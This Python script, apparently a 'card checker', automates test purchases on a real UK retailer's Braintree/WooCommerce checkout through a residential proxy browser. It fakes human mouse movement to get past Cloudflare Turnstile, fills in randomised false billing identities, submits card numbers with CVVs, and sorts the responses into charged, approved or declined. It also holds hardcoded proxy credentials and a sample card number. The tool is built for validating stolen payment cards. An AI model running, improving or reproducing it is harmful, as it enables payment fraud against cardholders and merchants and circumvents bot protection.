#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Braintree Checker via BrightData + Playwright
Dev: WAFA
"""

import os
import time
import json
import asyncio
import requests
import traceback
import random
import re
from datetime import datetime

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright


# ═══════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════
BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

BT_BASE_URL = "https://www.flue-warehouse.co.uk"
BT_PRODUCT_URL = f"{BT_BASE_URL}/twinwallflue/dinakdwtwinwallchimneysystems/125mm5inchdinakflue/chimneynoticeplate"
BT_CHECKOUT_URL = f"{BT_BASE_URL}/checkout"

TURNSTILE_SITEKEY = "0x4AAAAAACHo_9WpnMGLxwMh"


# ═══════════════════════════════════════════════════
# Braintree Checker Class
# ═══════════════════════════════════════════════════
class BraintreeChecker:
    def __init__(self):
        self.ua = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")
        self.bin_info = ""

    def _human_move(self, page):
        """تحريك الماوس بطريقة بشرية عشان نتخطى Turnstile"""
        try:
            # حرّك الماوس لعدة نقاط عشوائية
            for _ in range(5):
                x = random.randint(100, 1200)
                y = random.randint(100, 700)
                page.mouse.move(x, y, steps=random.randint(3, 8))
                time.sleep(random.uniform(0.1, 0.3))
        except:
            pass

    def _wait_turnstile(self, page, max_wait=60):
        """استنى Turnstile token يتملى"""
        start = time.time()
        while time.time() - start < max_wait:
            try:
                token = page.evaluate(
                    "document.querySelector('[name=cf-turnstile-response]')?.value || ''"
                )
                if token and len(token) > 20:
                    return token
            except:
                pass

            # حرّك الماوس وانتظر
            self._human_move(page)
            time.sleep(2)

        return None

    def _fill_card_braintree(self, page, number, mm, yy, cvv):
        """املأ الكارت في Braintree iframe"""
        try:
            # دوّر على iframes Braintree
            number_frame = None
            cvv_frame = None

            for frame in page.frames:
                try:
                    furl = (frame.url or "").lower()
                    if "braintree" in furl or "hosted" in furl:
                        # جرّب كل واحد
                        if frame.locator("#credit-card-number").count() > 0:
                            number_frame = frame
                        elif frame.locator("#cvv").count() > 0:
                            cvv_frame = frame
                        elif frame.locator("#expiration").count() > 0:
                            # نتأكد لو ده الـ exp frame
                            pass
                except:
                    continue

            # الطريقة التانية: استخدام page.frames مباشرة
            if not number_frame:
                for frame in page.frames:
                    try:
                        if frame.locator("input[name='credit-card-number']").count() > 0:
                            number_frame = frame
                            break
                    except:
                        continue

            if not cvv_frame:
                for frame in page.frames:
                    try:
                        if frame.locator("input[name='cvv']").count() > 0:
                            cvv_frame = frame
                            break
                    except:
                        continue

            # املأ الكارت
            filled = {'number': False, 'expiry': False, 'cvv': False}

            if number_frame:
                try:
                    number_frame.locator("#credit-card-number").fill(number, timeout=10000)
                    filled['number'] = True
                except Exception as e:
                    print(f"Number fill error: {e}")

            # الـ expiry والـ cvv ممكن يكونوا في نفس الـ iframe أو منفصلين
            for frame in page.frames:
                try:
                    if frame.locator("#expiration").count() > 0:
                        try:
                            frame.locator("#expiration").fill(f"{mm}{yy}", timeout=5000)
                            filled['expiry'] = True
                        except:
                            try:
                                frame.locator("#expiration").fill(f"{mm}/{yy}", timeout=5000)
                                filled['expiry'] = True
                            except:
                                pass
                        break
                except:
                    continue

            if cvv_frame:
                try:
                    cvv_frame.locator("#cvv").fill(cvv, timeout=10000)
                    filled['cvv'] = True
                except Exception as e:
                    print(f"CVV fill error: {e}")

            return filled
        except Exception as e:
            print(f"Card fill exception: {e}")
            return {'number': False, 'expiry': False, 'cvv': False}

    def _read_result(self, page, max_wait=30):
        """اقرا النتيجة بعد ما يضغط Place Order"""
        start = time.time()
        while time.time() - start < max_wait:
            try:
                # تحقق من URL
                current_url = page.url
                if "order-received" in current_url or "thank" in current_url.lower():
                    return "CHARGE", "Charged"

                # اقرا نص الصفحة
                body = page.inner_text("body")
                body_lower = body.lower()

                # استخرج الرسائل
                if "thank you" in body_lower or "order received" in body_lower:
                    return "CHARGE", "Charged"
                if "insufficient" in body_lower:
                    return "APPROVED", "Insufficient Funds"
                if "pick up card" in body_lower or "pickup card" in body_lower:
                    return "DECLINE", "Pick Up Card"
                if "do not honor" in body_lower or "do not honour" in body_lower:
                    return "DECLINE", "Do Not Honor"
                if "call issuer" in body_lower:
                    return "DECLINE", "Call Issuer"
                if "declined" in body_lower or "denied" in body_lower:
                    return "DECLINE", "Declined"
                if "cvv" in body_lower:
                    return "APPROVED", "CVV"
                if "expired" in body_lower:
                    return "DECLINE", "Expired Card"
                if "3d" in body_lower or "otp" in body_lower or "authenticate" in body_lower:
                    return "OTP", "3DS Required"

                # دور على رسائل الخطأ في الـ woocommerce-error
                err_elem = page.locator(".woocommerce-error, .wc-block-components-notice-banner.is-error").first
                if err_elem.count() > 0:
                    err_text = err_elem.inner_text().strip()
                    return "DECLINE", err_text[:100]
            except:
                pass

            time.sleep(2)

        return "ERROR", "no response"

    def check(self, card):
        """الفحص الرئيسي"""
        result = {
            'card': card,
            'status': 'ERROR',
            'message': '',
            'time': 0,
            'bin': card.split('|')[0][:6] if '|' in card else '',
            'bin_info': '',
        }

        t0 = time.time()

        # فورمات الكارت
        parts = re.split(r'[/|\-_\s]+', card.strip())
        if len(parts) != 4:
            result['message'] = 'Invalid format'
            return result

        number = re.sub(r'\D', '', parts[0])
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvv = parts[3]
        if len(yy) == 4:
            yy = yy[2:]

        # بيانات عشوائية
        first = random.choice(['James', 'Ahmed', 'Sarah', 'John', 'Emma', 'Mohamed'])
        last = random.choice(['Smith', 'Brown', 'Taylor', 'Khan', 'Ali'])
        email = f"user{random.randint(10000, 99999)}@gmail.com"
        phone = f"+44{random.randint(7000000000, 7999999999)}"
        address = f"{random.randint(1, 999)} High Street"
        city = "London"
        postcode = f"EC1A {random.randint(1, 9)}BB"

        cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

        try:
            pw = sync_playwright().start()
            browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)

            context = browser.new_context(
                viewport={"width": 1366, "height": 900},
                user_agent=self.ua,
                locale="en-GB",
            )
            page = context.new_page()
            page.set_default_timeout(60000)

            # 1. افتح المنتج
            page.goto(BT_PRODUCT_URL, wait_until="domcontentloaded", timeout=60000)
            time.sleep(2)
            self._human_move(page)

            # 2. أضف للسلة
            try:
                page.click("button.single_add_to_cart_button", timeout=10000)
                time.sleep(3)
            except:
                pass

            # 3. روح للـ checkout
            page.goto(BT_CHECKOUT_URL, wait_until="domcontentloaded", timeout=60000)
            time.sleep(4)
            self._human_move(page)

            # 4. استنى Turnstile
            turnstile_token = self._wait_turnstile(page, max_wait=60)
            if not turnstile_token:
                result['message'] = 'Turnstile timeout'
                return result

            # 5. املأ billing info
            try:
                page.fill("#billing_first_name", first, timeout=10000)
                page.fill("#billing_last_name", last, timeout=10000)
                page.fill("#billing_email", email, timeout=10000)
                page.fill("#billing_address_1", address, timeout=10000)
                page.fill("#billing_city", city, timeout=10000)
                page.fill("#billing_postcode", postcode, timeout=10000)
                try:
                    page.fill("#billing_phone", phone, timeout=5000)
                except:
                    pass
            except Exception as e:
                result['message'] = f'Billing fill: {str(e)[:60]}'
                return result

            # 6. املأ الكارت في iframe
            filled = self._fill_card_braintree(page, number, mm, yy, cvv)
            time.sleep(1)

            if not filled['number']:
                result['message'] = 'Card number fill failed'
                return result

            # 7. اضغط Place Order
            try:
                page.click("#place_order", timeout=10000)
            except:
                try:
                    page.click("button[name='woocommerce_checkout_place_order']", timeout=10000)
                except:
                    result['message'] = 'Place order failed'
                    return result

            # 8. اقرا النتيجة
            status, msg = self._read_result(page, max_wait=30)
            result['status'] = status
            result['message'] = msg

            # تنظيف
            try:
                context.close()
            except:
                pass
            try:
                browser.close()
            except:
                pass
            try:
                pw.stop()
            except:
                pass

        except Exception as e:
            result['message'] = f"{type(e).__name__}: {str(e)[:100]}"

        result['time'] = round(time.time() - t0, 2)
        return result


# ═══════════════════════════════════════════════════
# Quick Test (شغل مباشر للاختبار)
# ═══════════════════════════════════════════════════
if __name__ == "__main__":
    checker = BraintreeChecker()
    test_card = "5126693793783705|08|2030|560"
    print(f"Testing: {test_card}")
    r = checker.check(test_card)
    print(json.dumps(r, indent=2, ensure_ascii=False))
